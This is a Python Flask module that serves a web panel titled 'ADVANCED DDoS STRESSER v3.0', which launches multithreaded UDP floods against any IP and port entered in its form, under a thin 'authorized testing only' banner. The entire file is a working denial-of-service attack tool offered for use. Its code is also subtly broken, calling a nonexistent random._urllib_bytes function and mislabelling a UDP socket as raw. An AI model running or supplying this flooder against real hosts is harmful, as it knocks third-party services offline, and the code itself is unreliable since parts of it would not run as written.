from flask import Blueprint, request
import socket
import threading
import random
import time

script4_bp = Blueprint('script4', __name__)

# Attack Status Settings
stop_attack = False
logs = []

def attack_logic(ip, port, duration):
    global stop_attack, logs
    # Random bytes for the payload (1024 bytes)
    bytes_payload = random._urllib_bytes(1024)
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        if stop_attack:
            break
        try:
            # Creating a raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Flood
            addr = (str(ip), int(port))
            s.sendto(bytes_payload, addr)
            sent += 1
        except Exception as e:
            pass
    
    logs.append(f"🏁 Attack Finished. Sent {sent} packets to {ip}:{port}")

@script4_bp.route("/", methods=["GET", "POST"])
def index():
    global stop_attack, logs
    
    if request.method == "POST":
        target_ip = request.form.get("ip")
        target_port = request.form.get("port", 80)
        duration = int(request.form.get("duration", 30))
        threads = int(request.form.get("threads", 5))

        stop_attack = False
        logs = [f"🔥 Launching Advanced UDP Flood on {target_ip}:{target_port}..."]
        
        # Multithreading for maximum impact
        for i in range(threads):
            t = threading.Thread(target=attack_logic, args=(target_ip, target_port, duration))
            t.start()
        
        return "🔥 Attack Initiated! Check logs below."

    return f"""
    <div style="font-family: 'Courier New', monospace; padding: 20px; background: #000; color: #00ff00; height: 100vh;">
        <h2 style="color: #ff0000; text-decoration: underline;">⚡ ADVANCED DDoS STRESSER v3.0 ⚡</h2>
        <p style="color: #ffff00;">[WARNING] For Authorized Testing Only. Use of this tool for illegal activities is strictly prohibited.</p>
        
        <form method="POST" style="border: 1px solid #00ff00; padding: 20px; display: inline-block;">
            IP Address: <input name="ip" placeholder="192.168.1.1" style="background: #222; color: #0f0; border: 1px solid #0f0;" required><br><br>
            Port: <input name="port" type="number" value="80" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
            Duration (sec): <input name="duration" type="number" value="30" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
            Threads: <input name="threads" type="number" value="10" max="100" style="background: #222; color: #0f0; border: 1px solid #0f0;"><br><br>
            <button type="submit" style="background: #ff0000; color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold;">START FLOOD</button>
        </form>
        
        <div style="margin-top:20px; background: #111; padding: 15px; border: 1px dashed #00ff00;">
            <pre>{chr(10).join(logs) if logs else "Awaiting Target Data..."}</pre>
        </div>
        <br>
        <a href="/" style="color: #3498db; text-decoration: none;">⬅️ EXIT TO DASHBOARD</a>
    </div>
    """

